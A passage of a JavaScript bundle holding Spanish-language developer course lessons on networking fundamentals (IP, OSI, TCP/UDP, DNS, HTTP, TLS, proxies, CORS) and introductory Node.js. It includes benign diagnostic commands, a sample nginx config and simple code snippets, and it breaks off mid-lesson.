Para un desarrollador, una red no es ms que un conjunto de computadoras que intercambian mensajes. Entender cmo viajan estos mensajes es crucial para depurar aplicaciones y entender latencias.

## 1. Qu es una Red?
Es una infraestructura (cables, ondas de radio, satlites) que permite conectar nodos. 
*   **LAN (Local Area Network):** Tu casa o la oficina.
*   **WAN (Wide Area Network):** Conecta ciudades o pases.
*   **Internet:** Es la "Red de Redes". No es una entidad central cerrada, sino millones de redes privadas y pblicas conectadas entre s mediante protocolos estndar.

## 2. Direcciones IP: Tu documento de identidad
Cada dispositivo en una red necesita una direccin para ser encontrado.
*   **IPv4:** 4 nmeros (ej: \`192.168.1.1\`). Se estn agotando.
*   **IPv6:** Mucho ms largas y complejas (ej: \`2001:0db8:85a3:0000:0000:8a2e:0370:7334\`).

## 3. Puertos: Las puertas de tu casa
Si la IP es la direccin de tu edificio, el **puerto** es el nmero de departamento.
*   Tu computadora puede tener cientos de aplicaciones abiertas. Cada aplicacin "escucha" en un puerto especfico.
*   **Puertos comunes:**
    *   \`80\`: HTTP (Web sin seguridad)
    *   \`443\`: HTTPS (Web segura)
    *   \`5432\`: PostgreSQL
    *   \`3306\`: MySQL

---

### Misin Junior:
Abre una terminal y escribe \`ipconfig\` (Windows) o \`ifconfig/ip a\` (Linux/Mac). Identifica tu "Direccin IPv4". Esa es tu identidad dentro de tu red local.
`,completed:!1},{id:"net-02-modelo-osi",title:"Modelo OSI: Las 7 Capas de la Red",level:"junior",content:`# Leccin 2: El Modelo OSI (Explicado Simple)

El modelo OSI es un mapa mental de 7 capas que describe cmo viaja un dato desde tu aplicacin hasta el cable de red. No necesitas memorizar todo, pero s entender dnde trabajas t.

## Las 7 Capas del mapa:
1.  **Fsica:** Cables, fibra, seales elctricas.
2.  **Enlace de Datos:** Direcciones MAC (hardware de la placa de red).
3.  **Red:** Direcciones **IP** y Routers.
4.  **Transporte:** **TCP** y **UDP**. Asegura que los paquetes lleguen.
5.  **Sesin:** Mantiene la conexin abierta.
6.  **Presentacin:** Formatos de datos (JSON, encriptacin, compresin).
7.  **Aplicacin:** Donde vives t. Protocolos como **HTTP, FTP, SMTP**.

## Por qu importa?
Cuando un desarrollador dice "Tenemos un problema en capa 7", se refiere a que la red funciona bien, pero tu aplicacin (o servidor) est devolviendo un error (ej: un Error 500). Si dice "Es un problema de capa 3", significa que no hay conexin por IP.

---

### Misin Junior:
Entiende que como desarrollador Backend o Frontend, el 99% de tu tiempo estars en la **Capa 7 (Aplicacin)** moviendo JSONs, pero tus datos viajan por todas las capas inferiores de forma invisible.
`,completed:!1},{id:"net-03-tcp-udp",title:"TCP vs UDP: Confiabilidad vs Velocidad",level:"junior",content:`# Leccin 3: TCP vs UDP (Transporte)

En la capa de transporte, hay dos formas principales de enviar datos. Elegir la correcta define la velocidad y confiabilidad de tu app.

## 1. TCP (Transmission Control Protocol)
Es el protocolo "Corts y Seguro". Antes de enviar datos, establece una conexin (Handshake).
*   **Garanta:** Si un paquete se pierde, lo vuelve a pedir.
*   **Orden:** Los datos llegan exactamente en el orden que se enviaron.
*   **Uso:** Web (HTTP), Email, Transferencia de archivos (FTP), Bases de datos.

## 2. UDP (User Datagram Protocol)
Es el protocolo "Rpido y Despreocupado". Lanza los datos y no le importa si llegan o no.
*   **Garanta:** Ninguna. Si se pierde un dato, se perdi.
*   **Orden:** Pueden llegar desordenados.
*   **Uso:** Streaming de video (Netflix/YouTube), Videojuegos online, Llamadas de voz (Discord/WhatsApp), DNS.

## Cundo usar cada uno:
*   Si necesitas que el dato llegue sin errores (aunque tarde ms) -> **TCP**.
*   Si necesitas velocidad extrema y no importa si se pierde un pixel o medio segundo de audio -> **UDP**.

---

### Misin Junior:
Piensa en una partida de un juego online como Counter-Strike. Qu pasara si usara TCP? Si hay lag, el juego se congelara esperando los paquetes perdidos. En cambio, con UDP, simplemente ves un "teletransporte" y el juego sigue.
`,completed:!1},{id:"net-04-dns",title:"DNS: El Directorio Telefnico de Internet",level:"junior",content:`# Leccin 4: DNS (El Directorio Telefnico)

Internet no entiende nombres como \`google.com\`, solo entiende nmeros (IPs). El **DNS (Domain Name System)** es el encargado de traducir nombres humanos a direcciones de mquina.

## Cmo funciona el proceso?
1.  Escribes \`www.progavio.com\` en el navegador.
2.  Tu computadora le pregunta a un servidor DNS: "Qu IP tiene este nombre?".
3.  El servidor DNS responde: \`104.21.34.123\`.
4.  Tu navegador viaja a esa IP.

## Conceptos Clave:
*   **A Record:** Traduce un nombre a una IPv4.
*   **AAAA Record:** Traduce un nombre a una IPv6.
*   **CNAME:** Un alias. \`blog.tudominio.com\` apunta a \`tudominio.com\`.
*   **TTL (Time To Live):** Cunto tiempo se guarda la respuesta en memoria (cach) antes de volver a preguntar. Por eso los cambios de DNS a veces tardan horas en "propagarse".

---

### Misin Junior:
Abre tu terminal y usa el comando \`nslookup google.com\`. Vers la lista de IPs que corresponden a Google. Acabas de consultar un servidor DNS manualmente!
`,completed:!1},{id:"net-05-practica-junior",title:"Prctica Junior: Herramientas de Diagnstico",level:"junior",content:`# Prctica: Herramientas de Red para el Desarrollador

Un desarrollador junior debe saber usar las herramientas bsicas de diagnstico que vienen en cualquier sistema operativo.

---

## Reto 1: Comprobar Conectividad (PING)
El comando \`ping\` enva un pequeo paquete y espera respuesta.
*   **Misin:** Haz \`ping google.com\`. Observa el "time" (latencia en milisegundos). Si el tiempo es alto, tu conexin es lenta. Si dice "Timeout", el servidor no responde.

## Reto 2: Ver el Camino (TRACERT / TRACEROUTE)
Este comando muestra todos los "saltos" (routers) que hace tu mensaje hasta llegar a destino.
*   **Misin:** Haz \`tracert 8.8.8.8\` (Windows) o \`traceroute 8.8.8.8\` (Mac/Linux). Vers cmo tu mensaje pasa de tu router al de tu proveedor de internet, luego a otros pases, hasta llegar a Google.

## Reto 3: Puertos Abiertos (NETSTAT)
Qu aplicaciones estn escuchando en tu PC?
*   **Misin:** Ejecuta \`netstat -an\` (Windows) o \`sudo lsof -i -P -n\` (Mac/Linux). Identifica procesos usando el puerto 80 o 443.

---

### Solucin Sugerida (Misin cumplida):
Si lograste ver el tiempo de respuesta de un ping y los saltos de un tracert, ya tienes las bases para saber si un fallo es de tu cdigo o de la infraestructura de red.
`,completed:!1,isProject:!0},{id:"net-06-http",title:"HTTP y la Web: Mtodos, Status y Seguridad",level:"junior",content:`# Leccin 6: El protocolo HTTP y la Web

HTTP (HyperText Transfer Protocol) es el lenguaje universal que usan los navegadores y servidores para hablar entre s. Como desarrollador, este es el protocolo que ms usars en tu carrera.

## 1. Qu es HTTP?
Es un protocolo basado en **peticiones** (Request) y **respuestas** (Response). El cliente pide algo, el servidor responde algo.

## 2. Mtodos HTTP (Verbos)
Indican la accin que el cliente quiere realizar:
*   **GET:** Solicitar datos (no debe cambiar nada en el servidor).
*   **POST:** Enviar datos nuevos (ej: registrar un usuario).
*   **PUT:** Reemplazar un recurso existente (ej: actualizar todo el perfil).
*   **DELETE:** Eliminar un recurso.

## 3. Headers (Cabeceras)
Son metadatos que acompaan la peticin o respuesta:
*   \`Content-Type\`: Dice qu tipo de dato se enva (\`application/json\`, \`text/html\`).
*   \`Authorization\`: Contiene tokens de acceso para seguridad.
*   \`User-Agent\`: Identifica qu navegador o dispositivo hace la peticin.

## 4. Status Codes (Cdigos de Estado)
La respuesta del servidor siempre viene con un nmero:
*   **2xx (xito):** \`200 OK\`, \`201 Created\`.
*   **3xx (Redireccin):** \`301 Moved Permanently\`.
*   **4xx (Error del Cliente):** \`400 Bad Request\`, \`401 Unauthorized\`, \`404 Not Found\`.
*   **5xx (Error del Servidor):** \`500 Internal Server Error\`.

## 5. HTTPS y Seguridad
HTTPS es HTTP viajando sobre una capa segura (**TLS/SSL**).
*   **Encriptacin:** Nadie en el medio (ej: en el WiFi de una cafetera) puede leer tus datos.
*   **Certificados:** Asegura que el servidor es quien dice ser.

## 6. Cookies
Son pequeos trozos de texto que el servidor guarda en tu navegador.
*   Se usan principalmente para **mantener la sesin** (no tener que loguearte en cada click) y para preferencias del usuario.

---

### Misin Junior:
Abre tu navegador, presiona \`F12\` y ve a la pestaa **Network (Red)**. Carga cualquier pgina y observa las peticiones. Identifica el mtodo (GET), el Status Code (200) y los Headers de una de ellas.
`,completed:!1},{id:"net-07-handshake-websockets",title:"TCP Handshake, Latencia y WebSockets",level:"semi-senior",content:`# Leccin 7: TCP Handshake, Latencia y WebSockets

En el nivel Semi-Senior, dejamos de ver la red como un "tnel mgico" y empezamos a entender los mecanismos de negociacin y mantenimiento de conexiones de alta performance.

## 1. El TCP Three-Way Handshake
Antes de que se enve un solo byte de datos HTTP, TCP debe establecer una conexin confiable. Este proceso se llama "Handshake" y consta de tres pasos:
1.  **SYN (Synchronize):** El cliente enva un paquete con un nmero de secuencia inicial al servidor.
2.  **SYN-ACK (Synchronize-Acknowledgment):** El servidor responde confirmando la recepcin y enviando su propio nmero de secuencia.
3.  **ACK (Acknowledgment):** El cliente confirma la recepcin del servidor.
**Impacto:** Cada nueva conexin TCP requiere un viaje de ida y vuelta (Round Trip) completo antes de empezar. En redes lentas, esto introduce un retraso inicial notable.

## 2. Latencia (RTT)
La latencia es el tiempo que tarda un paquete en ir y volver (Round Trip Time). 
*   **Propagacin:** La velocidad de la luz en la fibra ptica tiene un lmite fsico. Cruzar el Atlntico siempre tardar al menos ~60ms.
*   **Procesamiento:** El tiempo que tardan los routers y firewalls en decidir a dnde enviar el paquete.
*   **Encolamiento:** Si un router est saturado, el paquete espera en una fila.

## 3. WebSockets (Full Duplex)
HTTP es "Request-Response" (el servidor no habla si no le preguntan). WebSockets rompe esto:
*   Inicia como una peticin HTTP (Upgrade) y luego se convierte en una conexin binaria persistente.
*   Permite que el servidor enve datos al cliente en tiempo real sin que este los pida (ej: chats, trading, notificaciones).

---

### Misin Semi-Senior:
Investiga el concepto de **TCP Fast Open**. Cmo ayuda este mecanismo a reducir la latencia del handshake en conexiones subsiguientes? Entender esto es la diferencia entre una app rpida y una app instantnea.
`,completed:!1},{id:"net-08-proxy-balanceo-cors",title:"Proxy Inverso, Balanceo de Carga y CORS",level:"semi-senior",content:`# Leccin 8: Proxy Inverso, Balanceo de Carga y CORS

Como desarrollador Semi-Senior, debes entender cmo se estructuran los servidores en produccin para manejar trfico masivo y seguridad.

## 1. Proxy Inverso (Reverse Proxy)
Un servidor (como Nginx o Apache) que se sita frente a tus servidores de aplicacin.
*   **Seguridad:** Oculta la identidad y direccin real de tus servidores internos.
*   **Terminacin SSL:** El proxy maneja el HTTPS pesado y entrega HTTP liviano a tus apps internas.
*   **Compresin y Cach:** Puede servir imgenes o archivos estticos sin molestar a tu cdigo de backend.

## 2. Load Balancing (Balanceo de Carga)
Distribuye las peticiones entrantes entre mltiples servidores de aplicacin.
*   **Algoritmos:** Round Robin (uno a cada uno), Least Connections (al que est menos ocupado), IP Hash (asigna siempre el mismo usuario al mismo servidor para mantener sesin).
*   **Health Checks:** El balanceador deja de enviar trfico a un servidor si este detecta que fall.

## 3. CORS (Cross-Origin Resource Sharing)
CORS NO es un error de cdigo, es una **caracterstica de seguridad del navegador**.
*   **El problema:** Por seguridad, un script en \`web-a.com\` no puede pedir datos a \`api-b.com\` a menos que \`api-b.com\` de permiso explcito.
*   **Preflight Request:** Antes de un POST o DELETE, el navegador enva un \`OPTIONS\`. El servidor debe responder con headers como \`Access-Control-Allow-Origin: *\`.
*   **La clave:** CORS se configura en el **servidor que recibe la peticin**, no en el cliente que la enva.

---

### Misin Semi-Senior:
Diferencia entre un **Forward Proxy** (el que usas para saltar un bloqueo de red) y un **Reverse Proxy** (el que usas para proteger tu infraestructura). Dibjalos mentalmente: el Forward protege al Cliente, el Reverse protege al Servidor.
`,completed:!1},{id:"net-09-practica-semi-senior",title:"Prctica: Simulacin de Arquitectura de Red",level:"semi-senior",content:`# Prctica: Simulacin de Arquitectura de Red

En este nivel, no solo diagnosticamos peticiones, sino que diseamos cmo fluyen a travs de una infraestructura profesional.

---

## Reto 1: Depuracin de Handshake y Latencia
**Consigna:** Usa las herramientas del navegador y la consola para medir el impacto de la red.
1.  En la pestaa **Network**, busca la columna "Waterfall". Identifica cunto tiempo se gasta en "Initial Connection" (Handshake) vs "Time to First Byte" (TTFB).
2.  Si el TTFB es alto, el problema es el servidor (tu cdigo). Si la "Initial Connection" es alta, es un problema de red o falta de optimizacin TLS.

## Reto 2: Configuracin Conceptual de Nginx
**Consigna:** Escribe la lgica de configuracin para un proxy inverso que:
1.  Reciba en el puerto 80.
2.  Redirija el trfico a una aplicacin Node.js corriendo internamente en el puerto 3000.
3.  Establezca un lmite de 10MB para subida de archivos (Client Max Body Size).

## Reto 3: Mitos y Realidades de CORS
**Consigna:** Identifica por qu falla esta peticin:
*   Cliente: \`frontend.com\` hace un \`PUT\` a \`api.com/users/1\`.
*   Servidor responde con: \`Access-Control-Allow-Origin: frontend.com\` pero se olvida de \`Access-Control-Allow-Methods: PUT\`.
*   **Resultado:** El navegador bloquear la respuesta aunque el "Origin" sea correcto. Configura correctamente los Headers de respuesta.

---

### Solucin Sugerida (Concepto Nginx):
\`\`\`nginx
server {
    listen 80;
    server_name misitio.com;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        client_max_body_size 10M;
    }
}
\`\`\`
Poder leer y escribir estas configuraciones bsicas es lo que separa a un desarrollador de software de un simple escritor de cdigo.
`,completed:!1,isProject:!0},{id:"net-10-tls",title:"TLS, Certificados y Seguridad de Red",level:"senior",content:`# Leccin 10: TLS, Certificados y Seguridad de Red

En el nivel Senior, la seguridad no es un agregado, es parte integral del diseo de la red. Entender cmo se cifra la comunicacin y cmo se validan las identidades es crtico.

## 1. TLS (Transport Layer Security)
TLS es el sucesor de SSL. Su objetivo es proporcionar privacidad e integridad de los datos entre dos aplicaciones.
*   **Handshake TLS:** Ocurre *despus* del handshake TCP. Incluye la negociacin de algoritmos de cifrado y el intercambio de claves.
*   **Cifrado Asimtrico vs Simtrico:** Se usa asimtrico (RSA/ECC) para intercambiar una clave secreta, y luego simtrico (AES) para la comunicacin de datos, por ser ms rpido.

## 2. Certificados Digitales (X.509)
Un certificado es un documento que vincula una clave pblica con una identidad (dominio).
*   **CA (Certificate Authority):** Entidades en las que todos confan (ej: Let's Encrypt). Si ellos firman tu certificado, el navegador confa en ti.
*   **Cadena de Confianza:** Tu certificado -> Certificado Intermedio -> Certificado Raz (Root CA).
*   **mTLS (Mutual TLS):** En entornos de microservicios, tanto el cliente como el servidor se presentan certificados el uno al otro para asegurar que ambos son legtimos.

## 3. Seguridad de Red (Defensa en Profundidad)
*   **Firewalls & WAF:** Un Firewall tradicional bloquea IP/Puertos. Un WAF (Web Application Firewall) analiza el trfico HTTP buscando ataques como SQL Injection o XSS.
*   **DDoS Mitigation:** Estrategias para absorber ataques de denegacin de servicio (Rate Limiting, IP Reputation, Scrubber Centers).
*   **VPNs y VPCs:** Aislamiento de infraestructura en nubes privadas virtuales.

---

### Misin Senior:
Investiga el concepto de **Certificate Pinning**. Por qu una aplicacin mvil querra ignorar la cadena de confianza del sistema operativo y confiar solo en un certificado especfico? Entiende los riesgos y beneficios de esta tcnica.
`,completed:!1},{id:"net-11-distribuida",title:"Networking en Microservicios y Cargas Distribuidas",level:"senior",content:`# Leccin 11: Networking en Microservicios y Arquitecturas Distribuidas

Cuando escalas a cientos de servicios, la red local desaparece y la comunicacin se vuelve el cuello de botella.

## 1. Service Discovery
Cmo sabe el Servicio A dnde est el Servicio B si las IPs cambian constantemente (ej: en Kubernetes)?
*   **Server-Side Discovery:** El cliente llama a un load balancer fijo que sabe a dnde ir.
*   **Client-Side Discovery:** El cliente consulta un registro (ej: Consul, Eureka) y elige el nodo directamente.

## 2. Service Mesh (La Red es Inteligente)
Una capa de infraestructura (ej: Istio, Linkerd) que maneja la comunicacin entre servicios mediante proxies "sidecar".
*   **Observabilidad:** Grficos automticos de quin habla con quin.
*   **Resiliencia:** Retries, Timeouts y Circuit Breakers automticos a nivel de red, sin tocar el cdigo de la app.

## 3. Comunicacin Asncrona vs Sncrona
*   **gRPC:** Alta performance mediante Protocol Buffers sobre HTTP/2. Ideal para comunicacin interna.
*   **Message Brokers:** (RabbitMQ, Kafka) Desacopla la red. El emisor no necesita que el receptor est "vivo" en ese instante.

## 4. Problemas Reales en Produccin
*   **Cascading Failures:** Un fallo en un servicio lento satura la red y tumba otros servicios sanos.
*   **DNS Polling:** Aplicaciones que cachean la IP de un servicio y no se enteran cuando este escala o cambia de nodo.
*   **Packet Loss Intermitente:** El infierno de los microservicios; difcil de replicar, solo visible con mtricas avanzadas.

---

### Misin Senior:
Disea mentalmente una solucin de **Circuit Breaker**. Qu debera pasar en la red cuando un servicio externo empieza a responder con errores 500 o tarda ms de 2 segundos? El objetivo es que tu sistema siga funcionando (aunque sea degradado).
`,completed:!1},{id:"net-12-practica-senior",title:"Prctica Senior: Diseo de Red Resiliente",level:"senior",content:`# Prctica Senior: Diseo de Red Resiliente y Segura

En este nivel final, el reto es disear la infraestructura de red para una startup en hiper-crecimiento.

---

## Reto 1: Diseo de Infraestructura Crtica
**Consigna:** Dibuja el diagrama lgico (o descrbelo) de una arquitectura que soporte los siguientes requisitos:
1.  **Alta Disponibilidad:** Dos regiones geogrficas distintas.
2.  **Seguridad:** Una red pblica (DMZ) para los proxies y una red privada aislada para las bases de datos.
3.  **Conexin entre regiones:** Uso de Peering o VPNs de baja latencia.

## Reto 2: Diagnstico de Incidentes de Produccin
**Consigna:** Analiza el siguiente escenario:
*   Durante un pico de trfico, los usuarios reportan que la app est "congelada".
*   Las mtricas de CPU del backend estn al 20%.
*   El Load Balancer reporta un incremento masivo de conexiones en estado \`TIME_WAIT\`.
*   **Preguntas:** Es un problema de cdigo o de configuracin de red? Cmo lo solucionaras a nivel de sistema operativo (Kernel tuning)?

## Reto 3: Transicin a mTLS
**Consigna:** Define el plan para implementar Mutual TLS en un clster de microservicios existente:
1.  Cmo gestionaras la rotacin de certificados sin downtime?
2.  Qu impacto tiene el handshake extra de mTLS en servicios que tienen miles de peticiones cortas por segundo?

---

### Solucin Sugerida (Escenario 2):
El problema de \`TIME_WAIT\` excesivo suele ser una saturacin de sockets en el balanceador. No es un error de lgica, sino que el sistema operativo agota los puertos disponibles para nuevas conexiones porque no libera los viejos lo suficientemente rpido. La solucin implica ajustar el \`net.ipv4.tcp_tw_reuse\` en el kernel de Linux.
`,completed:!1,isProject:!0},{id:"net-13-proyecto-redes",title:"Proyecto Prctico: Laboratorio de Networking y Diagnstico",level:"senior",content:`# Proyecto Prctico: Laboratorio de Networking y Diagnstico de APIs

Este proyecto final consolida todos los conocimientos del mdulo de Redes. Tu objetivo es actuar como un ingeniero de confiabilidad (SRE) para identificar por qu una API est fallando y cmo optimizar su comunicacin.

---

## 1. El Escenario de Simulacin
Imagina que tienes una aplicacin Frontend (\`localhost:3000\`) que intenta comunicarse con una API Backend (\`api.misistema.local:5000\`).

### Tarea 1: Simular la API (Conceptual)
Aunque no lances el servidor, analiza este flujo de "vida de una peticin":
1.  **Resolucin de Nombres:** El navegador busca \`api.misistema.local\`. No est en internet, es local. Dnde deberas configurarlo si no tienes un servidor DNS? (Pista: Archivo \`hosts\`).
2.  **Handshake:** Una vez obtenida la IP, se inicia la conexin en el puerto \`5000\`.

## 2. Anlisis de Requests (Deep Dive)
Usa las herramientas de desarrollador o \`curl -v\` para analizar una peticin real a cualquier API pblica (ej: \`https://jsonplaceholder.typicode.com/posts/1\`).

**Misin:** Identifica y explica qu sucede en cada uno de estos puntos del log de \`curl\`:
*   \`Connected to ... port 443 (#0)\`
*   \`ALPN, offering h2\`
*   \`SSL connection using TLSv1.3\`
*   \`GET /posts/1 HTTP/2\`
*   \`< HTTP/2 200\`

## 3. Diagnstico de Problemas (Laboratorio de Errores)
Para cada error reportado, indica la causa probable en qu capa del modelo OSI est fallando:

### Caso A: "Connection Refused"
*   **Sntoma:** Intentas conectar a la IP correcta pero el sistema operativo corta la conexin de inmediato.
*   **Diagnstico:** Est el proceso escuchando en el puerto? Hay un firewall en Capa 4 bloqueando la entrada?

### Caso B: "ERR_CORS_COMBINED_HEADER"
*   **Sntoma:** El servidor devuelve los datos (200 OK), pero el navegador no los muestra.
*   **Diagnstico:** Analiza los headers \`Access-Control-Allow-Origin\`. Estn configurados en el Backend?

### Caso C: "High TTFB (Time to First Byte)"
*   **Sntoma:** La conexin TCP es rpida, pero el navegador se queda "esperando" la respuesta por 5 segundos.
*   **Diagnstico:** La red est bien. El problema es Capa 7 (Lgica de negocio, consulta lenta a DB, procesamiento pesado).

## 4. Reto Final: El Salto de Proxy
Disea la cadena de comunicacin segura:
\`Cliente (Browser) -> HTTPS (443) -> Nginx Gateway -> HTTP (8080) -> Microservicio A\`.

**Pregunta Tcnica:** Si el Microservicio A recibe una peticin desde el gateway, la IP del cliente que ver ser \`127.0.0.1\` (la del proxy). Qu header HTTP debes configurar en el gateway para que el Microservicio A conozca la IP real del usuario? (Pista: \`X-Forwarded-For\`).

---

### Misin Cumplida:
Si puedes explicar este flujo completo, has dejado de ser un programador que "consume APIs" para convertirte en un desarrollador que entiende la infraestructura de internet.
`,completed:!1,isProject:!0}]},C1={id:"node",title:"Node.js",description:"Construye servidores y APIs robustas con el entorno de ejecucin de JavaScript ms popular.",completed:!1,lessons:[{id:"node-junior-que-es-node",title:"Qu es Node.js y cmo funciona?",level:"junior",content:`# Leccin 1: Qu es Node.js y cmo funciona?

Node.js no es un lenguaje de programacin ni un framework; es un **entorno de ejecucin (runtime)** para JavaScript fuera del navegador.

## 1. El Motor V8
Node.js utiliza el motor **V8** de Google Chrome (el mismo que usa tu navegador) para ejecutar cdigo JavaScript de forma extremadamente rpida. Chrome lo usa para renderizar pginas; Node lo usa para manejar lgica de servidor.

## 2. Basado en Eventos y No Bloqueante
Esta es la "magia" de Node. 
*   **Sncrono (Tradicional):** Si pides una pizza, te quedas parado en la puerta esperando sin hacer nada hasta que llegue. Si otra persona llama, tiene que esperar a que terminen contigo.
*   **Asncrono (Node.js):** Pides la pizza, te dan un ticket y te vas a ver una pelcula. Cuando la pizza est lista, te avisan (evento). Mientras tanto, la pizzera atendi a 20 personas ms.

Node.js puede manejar miles de conexiones simultneas porque no "se queda esperando" a que el disco duro lea un archivo o la base de datos responda; sigue ejecutando otras tareas.

## 3. Para qu sirve?
*   Crear APIs (servidores de datos).
*   Herramientas de lnea de comandos (como el propio \`npm\`).
*   Aplicaciones en tiempo real (Chat, juegos).
*   Streaming de video (Netflix usa Node).

## 4. Para qu NO sirve?
Node.js no es bueno para tareas que requieren mucho uso de CPU de forma intensiva y constante (como edicin de video de alta resolucin o clculos matemticos extremadamente complejos), ya que podra bloquear el hilo principal.

---

## Mini Ejercicio
Investiga en tu terminal si tienes Node instalado escribiendo \`node -v\`. Si te devuelve una versin (ej: v18.x.x), ests listo! Si no, debers descargarlo de nodejs.org.
`,completed:!1},{id:"node-junior-js-server",title:"JavaScript en el servidor",level:"junior",content:'# Leccin 2: JavaScript en el servidor\n\nEn el navegador, el objeto global es `window`. En Node.js, ese objeto no existe porque no hay una ventana de navegador.\n\n## 1. El objeto `global`\nEn Node, el objeto raz se llama `global`. Aqu viven funciones que ya conoces como `setTimeout`, `setInterval` y `console`.\n\n```javascript\n// Funciona igual que en el navegador\nsetTimeout(() => {\n  console.log("Servidor listo");\n}, 1000);\n```\n\n## 2. El objeto `process`\nEste objeto nos da informacin sobre el proceso actual que est ejecutando Node.\n*   `process.version`: Versin de Node.\n*   `process.platform`: Sistema operativo (win32, linux, darwin).\n*   `process.env`: Muy importante! Contiene las variables de entorno (claves secretas, puertos, etc.).\n*   `process.argv`: Argumentos que pasamos por la terminal al ejecutar el script.\n\n## 3. Lo que NO tenemos en Node\n*   `window` (No hay ventana).\n*   `document` (No hay DOM, no hay HTML para manipular directamente).\n*   `localStorage` (Usamos archivos o bases de datos).\n*   `alert()` (Usamos `console.log` o logs en archivos).\n\n## 4. Mentalidad Backend\nEn el frontend, escribes cdigo para **UN** usuario. En el backend, escribes cdigo para **MIL** usuarios que llaman al mismo tiempo. Un error en el navegador solo rompe la pgina de una persona. Un error en Node puede tumbar el servidor para todos.\n\n---\n\n## Mini Ejercicio\nCrea un archivo llamado `test.js` y escribe `console.log(process.platform)`. Ejectalo en tu terminal con el comando `node test.js`. Qu sistema operativo te detecta?\n',completed:!1},{id:"node-junior-event-loop",title:"Event Loop (El Corazn de Node)",level:"junior",content:`# Leccin 3: Event Loop (El Corazn de Node)

Node.js es **monohilo (single-threaded)**. Esto significa que solo puede ejecutar una instruccin a la vez. Sin embargo, puede manejar miles de peticiones. Cmo? Gracias al **Event Loop**.

## 1. El ciclo de vida de una tarea
Imagina a Node como un mesero en un restaurante:
1.  **Code Exec:** El mesero anota tu pedido (ejecuta tu cdigo sincrnico).
2.  **Libuv (Los Cocineros):** Si pides algo que tarda (leer un archivo, consultar una DB), el mesero le pasa la nota a los "cocineros" (el sistema operativo) y sigue atendiendo otras mesas.
3.  **Callback Queue:** Cuando los cocineros terminan, ponen el plato en una cinta transportadora.
4.  **Event Loop:** El mesero revisa constantemente la cinta. Si tiene un momento libre, toma el plato y lo entrega (ejecuta el callback).

## 2. Bloqueando el hilo (Lo que NO debes hacer)
Si escribes un bucle que tarda 10 segundos en terminar (un clculo matemtico pesado), el mesero se queda "congelado" procesando eso y no puede atender a nadie ms. Ninguna web cargar, nadie recibir respuesta.

\`\`\`javascript
//  ESTO ES PELIGROSO EN NODE
let i = 0;
while (i < 10000000000) { i++; } 
// El servidor est muerto mientras esto corre
\`\`\`

## 3. Asincrona con Callbacks
Antes usbamos callbacks para casi todo. Node tiene una convencin llamada **Error First Callback**:

\`\`\`javascript
const fs = require('fs');

fs.readFile('archivo.txt', 'utf8', (err, data) => {
  if (err) {
    console.error("Hubo un error");
    return;
  }
  console.log("Contenido:", data);
});
\`\`\`

---

## Mini Ejercicio
Qu crees que se imprimir primero en este cdigo?
\`\`\`javascript
console.log("A");
setTimeout(() => console.log("B"), 0);
console.log("C");
\`\`\`
Prubalo en la terminal. El resultado te sorprender y explica el Event Loop.
`,completed:!1},{id:"node-junior-npm-paquetes",title:"npm y Gestin de Paquetes",level:"junior",content:'# Leccin 4: npm y Gestin de Paquetes\n\n**npm** (Node Package Manager) es el registro de software ms grande del mundo. Viene instalado automticamente con Node.\n\n## 1. El comando `init`\nTodo proyecto de Node comienza creando un archivo llamado `package.json`. Es el "DNI" de tu proyecto.\n\n```bash\nnpm init -y\n```\nEl `-y` acepta todas las opciones por defecto ahorrndote tiempo.\n\n## 2. Instalando paquetes\nPara instalar una librera (por ejemplo, para manejar fechas):\n\n```bash\nnpm install date-fns\n```\nEsto har tres cosas:\n1.  Crea la carpeta `node_modules/` (donde vive el cdigo de la librera).\n2.  Agrega la librera a la seccin `dependencies` de tu `package.json`.\n3.  Crea un archivo `package-lock.json` (asegura que todos los desarrolladores instalen exactamente la misma versin).\n\n## 3. Dependencias vs DevDependencies\n*   **Dependencies:** Libreras necesarias para que la app funcione (ej: Express).\n*   **DevDependencies:** Herramientas solo para desarrollo (ej: un corrector de cdigo). Se instalan con `npm install --save-dev`.\n\n## 4. Scripts de npm\nEn `package.json` puedes crear atajos para comandos largos:\n\n```json\n"scripts": {\n  "start": "node index.js",\n  "dev": "nodemon index.js"\n}\n```\nLuego los ejecutas con `npm run dev` o `npm start`.\n\n---\n\n## Mini Ejercicio\nCrea una carpeta nueva, ejecuta `npm init -y` e instala la librera `colors`. Luego crea un `index.js` que diga `require(\'colors\'); console.log("Hola Node".green);` y ejectalo.\n',completed:!1},{id:"node-junior-modulos",title:"Sistema de Mdulos",level:"junior",content:`# Leccin 5: Sistema de Mdulos

En Node.js, cada archivo es un "mdulo". Para usar cdigo de un archivo en otro, debemos exportarlo e importarlo. Existen dos sistemas.

## 1. CommonJS (El estndar clsico)
Usa las palabras clave \`require\` y \`module.exports\`. Es el que vers en la mayora de tutoriales antiguos y proyectos legacy.

\`\`\`javascript
// matematicas.js
const sumar = (a, b) => a + b;
module.exports = { sumar };

// app.js
const { sumar } = require('./matematicas');
console.log(sumar(2, 2));
\`\`\`

## 2. ESModules (El estndar moderno)
Usa \`import\` y \`export\`. Es el mismo sistema que usa React. Para habilitarlo en Node, debes agregar \`"type": "module"\` en tu \`package.json\`.

\`\`\`javascript
// matematicas.js
export const sumar = (a, b) => a + b;

// app.js
import { sumar } from './matematicas.js'; //  Importante: hay que poner la extensin .js
\`\`\`

## 3. Mdulos Nativos (Build-in)
Node ya trae herramientas integradas que no necesitas instalar con npm:
*   \`fs\`: Para manejar archivos (FileSystem).
*   \`path\`: Para manejar rutas de carpetas.
*   \`http\`: Para crear servidores.
*   \`os\`: Informacin del sistema operativo.

## 4. Error Comn: Mezclar sistemas
No puedes usar \`require\` dentro de un archivo que est configurado como \`module\` (ESM), y viceversa, a menos que hagas configuraciones complejas. Elige uno y mantente fiel a l en todo tu proyecto.

---

## Mini Ejercicio
Crea dos archivos. Uno que exporte una funcin \`saludar(nombre)\` y otro que la importe y la ejecute. Intenta hacerlo usando CommonJS primero.
`,completed:!1},{id:"node-junior-servidor-basico",title:"Tu Primer Servidor HTTP",level:"junior",content:`# Leccin 6: Tu Primer Servidor HTTP

Antes de usar frameworks elegantes, vamos a ver cmo se crea un servidor usando solo lo que Node trae de fbrica.

## 1. El mdulo \`http\`
Node tiene un mdulo nativo llamado \`http\` que permite "escuchar" peticiones que llegan por un puerto.

\`\`\`javascript
const http = require('http');

const server = http.createServer((request, response) => {
  console.log("Lleg una peticin!");
  
  // Enviamos una cabecera diciendo que todo est bien (200) y que es texto plano
  response.writeHead(200, { 'Content-Type': 'text/plain' });
  
  // Enviamos el mensaje final
